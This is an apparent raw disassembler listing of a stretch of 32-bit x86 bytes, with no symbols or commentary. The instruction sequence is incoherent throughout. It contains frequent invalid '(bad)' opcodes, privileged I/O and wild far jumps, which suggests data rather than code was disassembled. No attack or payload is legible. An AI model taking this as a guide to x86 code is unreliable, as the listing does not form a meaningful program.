  41b3a3:	xchg   esi,eax
  41b3a4:	jge    0x41b36a
  41b3a6:	nop    DWORD PTR [ecx]
  41b3a9:	add    BYTE PTR [edi],al
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [edi+0x2933c8bf],al
  41b3b3:	sub    eax,0x8a4e9bd2
  41b3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3b9:	dec    edx
  41b3ba:	cs fwait
  41b3bc:	xchg   edx,eax
  41b3bd:	pop    ebx
  41b3be:	adc    al,0x44
  41b3c0:	mov    esi,0xab52c0a4
  41b3c5:	dec    ebx
  41b3c6:	ds loopne 0x41b427
  41b3c9:	or     esi,DWORD PTR [ebx-0x45]
  41b3cc:	cli    
  41b3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ce:	cmp    al,0x5f
  41b3d0:	cmp    al,BYTE PTR [ebp+0x73c49acb]
  41b3d6:	inc    esp
  41b3d7:	cmp    ebx,ebp
  41b3d9:	ret    
  41b3da:	or     eax,0x89b591a1
  41b3df:	sub    al,0x2b
  41b3e1:	lds    ecx,FWORD PTR [esi-0x4700f4c5]
  41b3e7:	mov    edx,0x3d11cd2f
  41b3ec:	cmp    esi,DWORD PTR [edi-0x45]
  41b3ef:	arpl   WORD PTR [ebx+0x75b5590],di
  41b3f5:	add    al,0xa6
  41b3f7:	sub    ecx,DWORD PTR [esi+0x3b]
  41b3fa:	out    dx,eax
  41b3fb:	(bad)  
  41b3fc:	mov    WORD PTR [edx+0x45fd0f47],cs
  41b402:	sub    ah,BYTE PTR ds:0x79c6445
  41b408:	inc    ax
  41b40a:	push   esp
  41b40b:	push   edi
  41b40c:	fld    TBYTE PTR [esi]
  41b40e:	push   ebp
  41b40f:	jg     0x41b431
  41b411:	in     al,0x30
  41b413:	je     0x41b47d
  41b415:	idiv   DWORD PTR [esi]
  41b417:	inc    ebp
  41b418:	add    DWORD PTR [ebx],esp
  41b41a:	outs   dx,DWORD PTR ds:[esi]
  41b41b:	pop    esi
  41b41c:	loope  0x41b3c0
  41b41e:	push   eax
  41b41f:	xchg   ebp,eax
  41b420:	mov    bl,dh
  41b422:	jl     0x41b3ce
  41b424:	adc    BYTE PTR [edi+eax*4+0x40],cl
  41b428:	jns    0x41b461
  41b42a:	fdiv   st,st(4)
  41b42c:	cwde   
  41b42d:	add    al,0x16
  41b42f:	icebp  
  41b430:	add    ecx,DWORD PTR [eax]
  41b432:	and    al,BYTE PTR [esi+0x6a]
  41b435:	or     eax,0x78e2a987
  41b43a:	xchg   esi,eax
  41b43b:	repnz in al,0xbc
  41b43e:	pop    eax
  41b43f:	xchg   ebx,eax
  41b440:	lods   al,BYTE PTR ds:[esi]
  41b441:	inc    esi
  41b442:	sbb    ah,bh
  41b444:	jns    0x41b3f2
  41b446:	leave  
  41b447:	mov    ecx,0xf56f88d6
  41b44c:	pop    es
  41b44d:	mov    ds:0x74c6a63a,al
  41b452:	jne    0x41b438
  41b454:	and    BYTE PTR ds:0x948a8437,ch
  41b45a:	jg     0x41b4cf
  41b45c:	dec    edi
  41b45d:	div    DWORD PTR ds:0x5db11b88
  41b463:	in     eax,0x73
  41b465:	xor    BYTE PTR [ecx],0x84
  41b468:	jge    0x41b46b
  41b46a:	adc    BYTE PTR [ecx],ch
  41b46c:	push   edx
  41b46d:	and    al,0xaf
  41b46f:	inc    edi
  41b470:	adc    bh,BYTE PTR [eax-0x71]
  41b473:	call   0xb8f9b738
  41b478:	nop
  41b479:	hlt    
  41b47a:	in     al,0xcb
  41b47c:	mov    al,0xe8
  41b47e:	outs   dx,BYTE PTR ds:[esi]
  41b47f:	xchg   DWORD PTR ds:0x4e95e437,ecx
  41b485:	inc    ecx
  41b486:	mov    WORD PTR [ecx+0x76c28863],ss
  41b48c:	cmp    al,0xd6
  41b48e:	xchg   DWORD PTR [edx+0x1b],ecx
  41b491:	dec    edx
  41b492:	cs push edi
  41b494:	mov    al,0xf5
  41b496:	lds    edx,FWORD PTR [edx-0x2e]
  41b499:	fiadd  DWORD PTR gs:[ecx+eax*2-0x41b02304]
  41b4a1:	xchg   ebx,eax
  41b4a2:	pminub mm5,QWORD PTR [eax+0x2675d155]
  41b4a9:	enter  0xfbcf,0x3f
  41b4ad:	in     eax,0x2e
  41b4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4b0:	test   DWORD PTR [edx-0x18],edi
  41b4b3:	jns    0x41b4fd
	...
  41b515:	add    ah,dl
  41b517:	in     al,dx
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	mov    bl,0x42
  41b524:	test   ah,0x16
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [esi-0x73],dh
  41b530:	xor    DWORD PTR [ebx],edi
  41b532:	mov    dh,0xbd
  41b534:	dec    BYTE PTR [ecx+0x3f417fe1]
  41b53a:	dec    ecx
  41b53b:	test   eax,0x924b946f
  41b540:	xchg   edi,eax
  41b541:	enter  0x868a,0x2c
  41b545:	push   edi
  41b546:	or     eax,0xc2977f0f
  41b54b:	fistp  WORD PTR [edi]
  41b54d:	cmp    BYTE PTR [eax],cl
  41b54f:	pop    esi
  41b550:	push   edx
  41b551:	js     0x41b5d1
  41b553:	inc    ebx
  41b554:	and    bl,cl
  41b556:	jnp    0x41b57e
  41b558:	dec    esi
  41b559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b55a:	in     eax,0xac
  41b55c:	xor    al,0x14
  41b55e:	and    eax,0x57bfbf6f
  41b563:	ds pop edx
  41b565:	in     eax,0xe7
  41b567:	dec    ecx
  41b568:	ins    BYTE PTR es:[edi],dx
  41b569:	retf   
  41b56a:	sbb    eax,0x6ae4d61a
  41b56f:	inc    ebp
  41b570:	scas   eax,DWORD PTR es:[edi]
  41b571:	inc    ebp
  41b572:	xchg   DWORD PTR [ebx-0x43],eax
  41b575:	cmp    al,0x3e
  41b577:	ret    0xb997
  41b57a:	add    DWORD PTR [ebx],eax
  41b57c:	(bad)  
  41b57d:	je     0x41b54d
  41b57f:	inc    ecx
  41b580:	loop   0x41b585
  41b582:	xchg   edi,eax
  41b583:	cmc    
  41b584:	mov    ah,0x96
  41b586:	mov    ch,0xce
  41b588:	fisubr DWORD PTR [eax-0x454ee0f8]
  41b58e:	push   esp
  41b58f:	or     DWORD PTR [ecx-0x44],eax
  41b592:	xchg   edx,eax
  41b593:	or     al,0xb6
  41b595:	ins    DWORD PTR es:[edi],dx
  41b596:	mov    esp,0xdc772209
  41b59b:	jno    0x41b60f
  41b59d:	sbb    ch,BYTE PTR [eax-0x56]
  41b5a0:	sub    ecx,DWORD PTR ds:0xd2a2491b
  41b5a6:	xor    BYTE PTR [ebx-0x9],ch
  41b5a9:	xlat   BYTE PTR ds:[ebx]
  41b5aa:	mov    dh,BYTE PTR [esi+0x6b]
  41b5ad:	repz gs ja 0x41b621
  41b5b1:	mov    ch,0x62
  41b5b3:	and    al,0x27
  41b5b5:	push   0x883e8037
  41b5ba:	sti    
  41b5bb:	adc    BYTE PTR [ecx-0x4a289602],0xb7
  41b5c2:	pusha  
  41b5c3:	xor    BYTE PTR [eax+0x4d4ed6c8],cl
  41b5c9:	dec    edi
  41b5ca:	in     al,0xeb
  41b5cc:	pusha  
  41b5cd:	jmp    0x41b551
  41b5cf:	ret    
  41b5d0:	or     DWORD PTR [edx],esp
  41b5d2:	(bad)  
  41b5d4:	push   ecx
  41b5d5:	out    0x9d,eax
  41b5d7:	and    eax,0x2d7547d7
  41b5dc:	jae    0x41b5d5
  41b5de:	ret    
  41b5df:	adc    al,0x77
  41b5e1:	clc    
  41b5e2:	nop
  41b5e3:	jae    0x41b5f1
  41b5e5:	mov    dh,0xc4
  41b5e7:	or     bl,dl
  41b5e9:	mov    al,0x54
  41b5eb:	hlt    
  41b5ec:	aam    0x70
  41b5ee:	sbb    eax,0x708bdf2
  41b5f3:	lahf   
  41b5f4:	cmc    
  41b5f5:	push   edx
  41b5f6:	xor    ecx,esp
  41b5f8:	pop    ebx
  41b5f9:	popf   
  41b5fa:	pop    ss
  41b5fb:	sbb    BYTE PTR [ebx],cl
  41b5fd:	aas    
  41b5fe:	in     al,0x31
  41b600:	mov    BYTE PTR [esi+0x12],al
  41b603:	push   edi
  41b604:	out    dx,al
  41b605:	stos   DWORD PTR es:[edi],eax
  41b606:	xchg   esp,eax
  41b607:	mov    esp,0xa7192c7b
  41b60c:	add    edi,esi
  41b60e:	dec    esi
  41b60f:	xor    edi,DWORD PTR [edi]
  41b611:	dec    ebp
  41b612:	inc    edi
  41b613:	outs   dx,DWORD PTR ds:[esi]
  41b614:	imul   edx,DWORD PTR [esi],0xd57efa6a
  41b61a:	xchg   ebx,eax
  41b61b:	in     al,0x44
  41b61d:	jne    0x41b61a
  41b61f:	xchg   ebx,eax
  41b620:	push   es
  41b621:	push   edi
  41b622:	(bad)  
  41b623:	or     DWORD PTR [edi-0x7bc29501],esp
  41b629:	or     eax,0x66817fb9
  41b62e:	outs   dx,DWORD PTR ds:[esi]
  41b62f:	cs cmp al,0x25
  41b632:	push   esp
  41b633:	lods   eax,DWORD PTR ds:[esi]
  41b634:	dec    edi
	...
  41b695:	add    BYTE PTR [eax-0x2469e49d],ch
  41b69b:	(bad)  
  41b69c:	lods   eax,DWORD PTR ds:[esi]
  41b69d:	jg     0x41b6db
  41b69f:	sub    al,dl
  41b6a1:	add    BYTE PTR [edx+0x5e],ch
  41b6a4:	retf   0x1d31
  41b6a7:	and    DWORD PTR [ecx],eax
  41b6a9:	add    BYTE PTR [edi],al
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    BYTE PTR [edx+0x76],dh
  41b6b0:	sub    eax,0x2db0b449
  41b6b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6b6:	jmp    0x5c9d:0xdc2e1d4
  41b6bd:	sbb    eax,0xe426ae83
  41b6c2:	pushf  
  41b6c3:	mov    ch,0xca
  41b6c5:	jmp    0x41b6ef
  41b6c7:	dec    eax
  41b6c8:	mov    al,ds:0x3914aef0
  41b6cd:	out    0xa8,eax
  41b6cf:	push   0xf4ba22ca
  41b6d4:	mov    ds:0x81f3db4a,al
  41b6d9:	and    DWORD PTR [edi+0x4],0xfffffffd
  41b6dd:	jl     0x41b6f5
  41b6df:	lods   al,BYTE PTR ds:[esi]
  41b6e0:	mov    ecx,DWORD PTR [ecx-0x3624d30d]
  41b6e6:	inc    bx
  41b6e8:	les    ebp,FWORD PTR [eax-0x2011eddf]
  41b6ee:	and    bl,BYTE PTR [ecx-0xa]
  41b6f1:	lea    edx,gs:[ebx+0x26d5cf8e]
  41b6f8:	or     al,0x40
  41b6fa:	jl     0x41b721
  41b6fc:	les    esi,FWORD PTR [edx-0x39]
  41b6ff:	aas    
  41b700:	in     al,0xd3
  41b702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b703:	fcmovb st,st(1)
  41b705:	mov    eax,0xc3431a78
  41b70a:	jnp    0x41b701
  41b70c:	lock jl 0x41b701
  41b70f:	call   0x2fff53ad
  41b714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b715:	(bad)  
  41b716:	imul   ebp,DWORD PTR [ebx-0xbbe47a9],0xfffffff4
  41b71d:	dec    edx
  41b71e:	in     eax,dx
  41b71f:	shl    BYTE PTR [edi-0x6e617a7d],1
  41b725:	mov    al,BYTE PTR [edx]
  41b727:	pushf  
  41b728:	repz push eax
  41b72a:	pop    eax
  41b72b:	mov    ebp,0x87b1429e
  41b730:	fsubr  QWORD PTR ds:0x8a7f98ca
  41b736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b737:	or     DWORD PTR [eax+eiz*8+0x7],ebx
  41b73b:	imul   eax,esi,0x7c095212
  41b741:	inc    ecx
  41b742:	jmp    0x41b799
  41b744:	pop    ds
  41b745:	inc    esi
  41b746:	cdq    
  41b747:	int    0xba
  41b749:	cmp    ebp,DWORD PTR [edi-0x1c855687]
  41b74f:	fsubr  QWORD PTR [ecx-0x429f73ae]
  41b755:	ss jnp 0x41b7bd
  41b758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b759:	push   ds
  41b75a:	cmp    DWORD PTR [eiz*8-0x66ab348],ecx
  41b761:	adc    BYTE PTR [ebp-0x5205a06],cl
  41b767:	or     ch,BYTE PTR [eax-0x23]
  41b76a:	sbb    edi,edi
  41b76c:	stc    
  41b76d:	pop    ebp
  41b76f:	loope  0x41b701
  41b771:	mov    ds:0xe678ff88,eax
  41b776:	or     ch,dh
  41b778:	das    
  41b779:	push   0xec46f85c
  41b77e:	retf   
  41b77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b780:	sbb    eax,0xbbe208cc
  41b785:	inc    eax
  41b786:	xchg   esp,eax
  41b787:	add    DWORD PTR [eax+edi*8+0x6ddaad08],ecx
  41b78e:	dec    edi
  41b78f:	adc    esi,eax
  41b791:	mov    esi,0xb00961cf
  41b796:	repnz sub eax,0xc55ba08a
  41b79c:	mov    al,0x42
  41b79e:	jnp    0x41b79e
  41b7a0:	xchg   ebx,eax
  41b7a1:	xor    BYTE PTR [ebx+0x6496f82e],0xd2
  41b7a8:	lods   al,BYTE PTR ds:[esi]
  41b7a9:	xor    ah,BYTE PTR [edi]
  41b7ab:	repz jbe 0x41b783
  41b7ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7af:	test   DWORD PTR ds:0x8ec4e3e3,ebx
	...
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0x6b,al
  41b823:	call   0x22666998
  41b828:	add    DWORD PTR [eax],eax
  41b82a:	pop    es
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    ah,cl
  41b82f:	or     edx,DWORD PTR [edi]
  41b831:	into   
  41b832:	dec    ebp
  41b833:	xor    DWORD PTR [esi],edx
  41b835:	mov    bl,0x4
  41b837:	lahf   
  41b838:	fsub   DWORD PTR [ecx+0xf]
  41b83b:	aam    0xca
  41b83d:	mov    bl,0x11
  41b83f:	jp     0x41b7cc
  41b841:	mov    ch,0xb7
  41b843:	jl     0x41b889
  41b845:	mov    al,0xf7
  41b847:	dec    esp
  41b848:	dec    edi
  41b849:	mov    bl,0x41
  41b84b:	sub    BYTE PTR [eax-0x42],al
  41b84e:	push   edi
  41b84f:	stos   BYTE PTR es:[edi],al
  41b850:	aas    
  41b851:	dec    ecx
  41b852:	xchg   BYTE PTR [ecx+0x324ca8b2],bl
  41b858:	mov    dl,0x92
  41b85a:	lea    esp,[ecx+0x328a0744]
  41b860:	mov    dl,0x53
  41b862:	test   al,0x7d
  41b864:	sbb    DWORD PTR [eax+0x60bc970],ebx
  41b86a:	(bad)  
  41b86b:	cwde   
  41b86c:	out    0x22,eax
  41b86e:	lds    ebp,FWORD PTR [ecx]
  41b870:	sar    eax,0x6
  41b873:	iret   
  41b874:	imul   eax,DWORD PTR ds:0x8da4317,0x9f80fc0d
  41b87e:	aad    0x3c
  41b880:	push   esi
  41b881:	jecxz  0x41b8d7
  41b883:	inc    edx
  41b884:	mov    bl,BYTE PTR [eax]
  41b886:	mov    ecx,0x8a0140f0
  41b88b:	retf   
  41b88c:	mov    edi,0x4ef0fcb5
  41b891:	xchg   DWORD PTR [eax],ebx
  41b893:	jae    0x41b85d
  41b895:	frstor [ebp+0x69]
  41b898:	add    al,0x7d
  41b89a:	add    esi,ecx
  41b89c:	cwde   
  41b89d:	or     BYTE PTR [edi-0x1df47c86],dh
  41b8a3:	add    dh,BYTE PTR [si-0x73]
  41b8a7:	mov    cl,0xe0
  41b8a9:	dec    edi
  41b8aa:	sub    ah,ch
  41b8ac:	mov    WORD PTR [ebx+0x60f147a8],cs
  41b8b2:	pop    eax
  41b8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8b4:	jge    0x41b889
  41b8b6:	dec    edx
  41b8b7:	lods   al,BYTE PTR ds:[esi]
  41b8b8:	mov    bl,bh
  41b8ba:	mul    BYTE PTR [eax]
  41b8bc:	xlat   BYTE PTR ds:[ebx]
  41b8bd:	adc    dh,0xbc
  41b8c0:	ds es scas al,BYTE PTR es:[edi]
  41b8c3:	pop    es
  41b8c4:	fcmovne st,st(0)
  41b8c6:	or     ecx,esp
  41b8c8:	shr    BYTE PTR [ebp-0x6d54092e],1
  41b8ce:	ins    BYTE PTR es:[edi],dx
  41b8cf:	jge    0x41b8a9
  41b8d1:	dec    esi
  41b8d2:	xchg   ecx,eax
  41b8d3:	fdiv   st,st(7)
  41b8d5:	mov    edx,0xe7c3a7c3
  41b8da:	or     ecx,DWORD PTR es:[edi+ebp*4]
  41b8de:	mov    ds:0x2364e634,al
  41b8e3:	xor    eax,0xc24285a6
  41b8e8:	cdq    
  41b8e9:	enter  0x252e,0xe0
  41b8ed:	push   ebx
  41b8ee:	cld    
  41b8ef:	lods   al,BYTE PTR ds:[esi]
  41b8f0:	fld    DWORD PTR [edx-0x28665aed]
  41b8f6:	loope  0x41b8b4
  41b8f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f9:	fcom   DWORD PTR [ebx-0x15]
  41b8fc:	pop    esi
  41b8fd:	mov    edi,0x4c7bea70
  41b902:	cmp    dh,BYTE PTR [edx-0x75]
  41b905:	lock pop esi
  41b907:	xchg   DWORD PTR [esi+0x72],ecx
  41b90a:	mov    bl,0xb9
  41b90c:	mov    edx,0x3154251a
  41b911:	inc    esi
  41b912:	addr16 mov ds:0x4306,eax
  41b916:	sbb    bh,BYTE PTR [ebp+0x28281394]
  41b91c:	mov    ah,0x7f
  41b91e:	pushf  
  41b91f:	test   al,0x5b
  41b921:	ins    DWORD PTR es:[edi],dx
  41b922:	stos   BYTE PTR es:[edi],al
  41b923:	sub    ch,BYTE PTR [edi+0x4f]
  41b926:	mov    bl,0xa7
  41b928:	pop    esi
  41b929:	pusha  
  41b92a:	or     DWORD PTR [edi-0x57],eax
  41b92d:	clc    
  41b92e:	pop    DWORD PTR [edx]
  41b930:	cmp    al,0xd6
  41b932:	popf   
  41b933:	add    eax,0x47
	...
  41b994:	add    BYTE PTR [eax],al
  41b996:	ret    
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	inc    edx
  41b9a3:	stc    
  41b9a4:	cmp    ch,dh
  41b9a6:	sub    esp,DWORD PTR [ebx]
  41b9a8:	add    DWORD PTR [eax],eax
  41b9aa:	pop    es
  41b9ab:	add    DWORD PTR [eax],eax
  41b9ad:	add    bl,ch
  41b9af:	and    DWORD PTR [edi-0x8],eax
  41b9b2:	jmp    0x41ba22
  41b9b4:	rol    BYTE PTR [ebp+ebx*4-0x66],cl
  41b9b8:	xor    ah,BYTE PTR [edi+ebx*8]
  41b9bb:	clc    
  41b9bc:	push   0x6e
  41b9be:	xor    DWORD PTR ds:0x79d0911e,ebx
  41b9c4:	mov    edi,0x5eeae10
  41b9c9:	call   0x3c49:0xa0b5c367
  41b9d0:	pop    esi
  41b9d1:	ret    
  41b9d2:	add    al,0x3f
  41b9d4:	fwait
  41b9d5:	dec    ebx
  41b9d6:	in     al,0x54
  41b9d8:	(bad)  
  41b9d9:	out    0x19,eax
  41b9db:	jo     0x41ba10
  41b9dd:	std    
  41b9de:	mov    dh,0x2b
  41b9e0:	adc    DWORD PTR [eax+0x5178a9fc],esp
  41b9e6:	imul   BYTE PTR [ebx+0x77]
  41b9e9:	pushf  
  41b9ea:	add    dl,ah
  41b9ec:	jecxz  0x41ba43
  41b9ee:	test   al,0x76
  41b9f0:	pop    ss
  41b9f1:	mov    al,0x46
  41b9f3:	(bad)  
  41b9f4:	outs   dx,DWORD PTR ds:[esi]
  41b9f5:	sbb    ah,BYTE PTR [esi]
  41b9f7:	mov    eax,0xd57eb6ca
  41b9fc:	clc    
  41b9fd:	rcl    BYTE PTR [edi-0x39],1
  41ba00:	into   
  41ba01:	jle    0x41ba2d
  41ba03:	cmc    
  41ba04:	leave  
  41ba05:	xor    eax,0x6d425ffa
  41ba0a:	xchg   ebx,eax
  41ba0b:	jmp    0x9e3b:0x132f2046
  41ba12:	icebp  
  41ba13:	push   ss
  41ba14:	pop    eax
  41ba15:	call   0xec57c773
  41ba1a:	jmp    0x41ba4c
  41ba1c:	hlt    
  41ba1d:	jnp    0x41b9b6
  41ba1f:	or     dl,ch
  41ba21:	retf   
  41ba22:	pushf  
  41ba23:	lods   al,BYTE PTR ds:[esi]
  41ba24:	inc    esi
  41ba25:	dec    esi
  41ba26:	jle    0x41ba8c
  41ba28:	xchg   ecx,eax
  41ba29:	stc    
  41ba2a:	lds    esp,FWORD PTR [esi*1+0xd4a473a]
  41ba31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba32:	xchg   edx,eax
  41ba33:	scas   al,BYTE PTR es:[edi]
  41ba34:	jecxz  0x41ba51
  41ba36:	jmp    0x24e37c4c
  41ba3b:	lock or eax,0xcd5734b8
  41ba41:	inc    edi
  41ba42:	popa   
  41ba43:	push   ss
  41ba44:	xlat   BYTE PTR ds:[ebx]
  41ba45:	mov    ecx,0x5b092e9e
  41ba4a:	jb     0x41ba3d
  41ba4c:	aaa    
  41ba4d:	std    
  41ba4e:	cld    
  41ba4f:	cli    
  41ba50:	mov    dl,0x89
  41ba52:	xchg   esi,eax
  41ba53:	and    bh,dl
  41ba55:	jnp    0x41ba53
  41ba57:	(bad)
  41ba5b:	loope  0x41ba12
  41ba5d:	cmp    al,0xcc
  41ba5f:	cmp    DWORD PTR [edx+ecx*1],ecx
  41ba62:	dec    esi
  41ba63:	es clc 
  41ba65:	add    DWORD PTR [esi+0x5b],0xffffffdc
  41ba69:	std    
  41ba6a:	popa   
  41ba6b:	mov    dh,0x17
  41ba6d:	mov    ds:0xae0fb2f8,al
  41ba72:	into   
  41ba73:	int3   
  41ba74:	mov    edi,0x43928456
  41ba79:	push   ss
  41ba7a:	adc    DWORD PTR [esi+0x9ae0efd],0xffffffdc
  41ba81:	mov    BYTE PTR [ebp-0x68a64c49],0xda
  41ba88:	lock mov ds:0xd5ba3f0f,eax
  41ba8e:	add    cl,BYTE PTR [ebx]
  41ba90:	adc    DWORD PTR [ecx],eax
  41ba92:	dec    edx
  41ba93:	pop    edx
  41ba94:	outs   dx,DWORD PTR ds:[esi]
  41ba95:	iret   
  41ba96:	push   esp
  41ba97:	je     0x41ba7f
  41ba99:	push   0x31
  41ba9b:	mov    ds:0x5da587d2,eax
  41baa0:	or     DWORD PTR [ebp-0x41],edi
  41baa3:	dec    edx
  41baa4:	std    
  41baa5:	or     DWORD PTR [edi+0x5],ebp
  41baa8:	stos   DWORD PTR es:[edi],eax
  41baa9:	test   ecx,ecx
  41baab:	and    dl,BYTE PTR [esp+eax*4]
  41baae:	push   ebp
  41baaf:	iret   
  41bab0:	pop    ecx
  41bab1:	jle    0x41bb21
  41bab3:	dec    edx
  41bab4:	pop    ebx
	...
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	mov    cl,0x13
  41bb24:	or     ch,ah
  41bb26:	xor    ah,BYTE PTR [ecx+eax*1]
  41bb29:	add    BYTE PTR [edi],al
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [ebx-0x7210122e],cl
  41bb33:	sbb    bh,dh
  41bb35:	dec    ebp
  41bb36:	(bad)  
  41bb38:	in     al,0xd2
  41bb3a:	out    0x99,eax
  41bb3c:	out    0xcf,eax
  41bb3e:	ret    
  41bb3f:	and    al,0xfd
  41bb41:	arpl   WORD PTR [edx-0xe],bp
  41bb44:	popa   
  41bb45:	dec    BYTE PTR [esi-0x18fcb068]
  41bb4b:	pop    edi
  41bb4c:	ret    
  41bb4d:	mov    dl,0xa2
  41bb4f:	(bad)  
  41bb50:	push   DWORD PTR [ecx+0x2c53b8d]
  41bb56:	into   
  41bb57:	test   bl,cl
  41bb59:	adc    al,0x76
  41bb5b:	fmul   DWORD PTR [esi-0x2d0a6fb7]
  41bb61:	mov    ebx,DWORD PTR [ecx+0x36197384]
  41bb67:	inc    cl
  41bb69:	pop    edx
  41bb6a:	outs   dx,DWORD PTR ds:[esi]
  41bb6b:	imul   esp,DWORD PTR [edi+0x5d0f44ad]
  41bb72:	ss pop esi
  41bb74:	xchg   esp,eax
  41bb75:	in     eax,0x7c
  41bb77:	xor    dl,0xbf
  41bb7a:	or     BYTE PTR [ecx+0x29],cl
  41bb7d:	popf   
  41bb7e:	fst    QWORD PTR [ebp-0x1b]
  41bb81:	mov    eax,0xda00f043
  41bb86:	arpl   WORD PTR [esp+eax*4+0x46],bx
  41bb8a:	sbb    bh,BYTE PTR [eax+0x66]
  41bb8d:	mov    edx,0x99f352a5
  41bb92:	add    dl,BYTE PTR [ecx-0x130b1650]
  41bb98:	ret    0x8843
  41bb9b:	in     eax,0xde
  41bb9d:	test   DWORD PTR [edi+eiz*1],ebp
  41bba0:	lock mov ebx,0x844eaf2a
  41bba6:	mov    edi,es
  41bba8:	xlat   BYTE PTR ds:[ebx]
  41bba9:	push   ebx
  41bbaa:	adc    ch,BYTE PTR [edx]
  41bbac:	inc    edi
  41bbad:	call   0xbf54:0x7d054c21
  41bbb4:	pop    ecx
  41bbb5:	test   eax,edx
  41bbb7:	xor    BYTE PTR [ebx+ebx*4+0x7f8165b],bl
  41bbbe:	enter  0x7ec2,0x56
  41bbc2:	cmc    
  41bbc3:	shl    BYTE PTR [ebp+0x9],cl
  41bbc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbc7:	jge    0x41bb7a
  41bbc9:	push   ss
  41bbca:	fmul   st(2),st
  41bbcc:	shl    ebx,cl
  41bbce:	xchg   ecx,eax
  41bbcf:	inc    ebx
  41bbd0:	xlat   BYTE PTR ds:[ebx]
  41bbd1:	icebp  
  41bbd2:	iret   
  41bbd3:	outs   dx,DWORD PTR ds:[esi]
  41bbd4:	jecxz  0x41bb67
  41bbd6:	pop    esp
  41bbd8:	dec    edi
  41bbd9:	das    
  41bbda:	(bad)  
  41bbdb:	dec    edi
  41bbdc:	mov    ch,0xbf
  41bbde:	lods   eax,DWORD PTR ds:[esi]
  41bbdf:	test   eax,0xa2c20c8f
  41bbe4:	sti    
  41bbe5:	mov    ecx,DWORD PTR [ebx]
  41bbe7:	aas    
  41bbe8:	pop    ecx
  41bbe9:	or     dl,BYTE PTR [eax-0x26]
  41bbec:	cmp    al,cl
  41bbee:	dec    ecx
  41bbef:	lds    ebp,FWORD PTR [esi-0x7a]
  41bbf2:	xor    al,0xe2
  41bbf4:	cmp    BYTE PTR [esi-0x8],ah
  41bbf7:	ror    ch,1
  41bbf9:	(bad)  
  41bbfa:	ins    DWORD PTR es:[edi],dx
  41bbfb:	pop    ss
  41bbfc:	clc    
  41bbfd:	bound  ebp,QWORD PTR [ebx-0x5a236b09]
  41bc03:	pop    esp
  41bc04:	push   edi
  41bc05:	mov    bh,BYTE PTR [edx-0x7d]
  41bc08:	and    bl,BYTE PTR [ebx-0x3f39a85e]
  41bc0e:	ds xchg ebx,eax
  41bc10:	sub    eax,DWORD PTR ds:0x83e7d915
  41bc16:	push   0x79
  41bc18:	std    
  41bc19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc1a:	aad    0x74
  41bc1c:	sti    
  41bc1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc1e:	dec    ecx
  41bc1f:	push   ds
  41bc20:	jge    0x41bc19
  41bc22:	cwde   
  41bc23:	bound  edi,QWORD PTR [esp+esi*1]
  41bc26:	aas    
  41bc27:	or     ebp,DWORD PTR [ebp+edi*8+0x537c9d43]
  41bc2e:	aaa    
  41bc2f:	daa    
  41bc30:	adc    DWORD PTR [edi],ebx
  41bc32:	push   edx
  41bc33:	retf   0x36
	...
  41bc96:	shl    BYTE PTR [edx],cl
  41bc98:	cli    
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0xf28248d
  41bca4:	dec    esp
  41bca5:	int    0x39
  41bca7:	and    eax,0x1070001
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	add    eax,0x15918d30
  41bcb3:	shl    BYTE PTR [esi],1
  41bcb5:	call   0xd6bc:0xea43aeae
  41bcbc:	fnstsw WORD PTR [ebp+eiz*1+0x2b]
  41bcc0:	cmp    ebx,DWORD PTR [ecx+edi*8-0x3dd99718]
  41bcc7:	fcomp  st(7)
  41bcc9:	and    dh,cl
  41bccb:	push   esi
  41bccc:	cmp    ah,BYTE PTR [edi+edi*8-0x67a52106]
  41bcd3:	pop    ds
  41bcd4:	(bad)  
  41bcd5:	fucomp st(6)
  41bcd7:	mov    ebp,0x7363868c
  41bcdc:	cdq    
  41bcdd:	aaa    
  41bcde:	pop    es
  41bcdf:	(bad)  
  41bce1:	cmp    eax,0xae3e0017
  41bce6:	je     0x41bce7
  41bce8:	imul   esi,DWORD PTR [esp+esi*2-0x6b17ac23],0xcbba2ca7
  41bcf3:	dec    ebx
  41bcf4:	push   eax
  41bcf5:	sbb    DWORD PTR [ebx],eax
  41bcf7:	jmp    0x41bd68
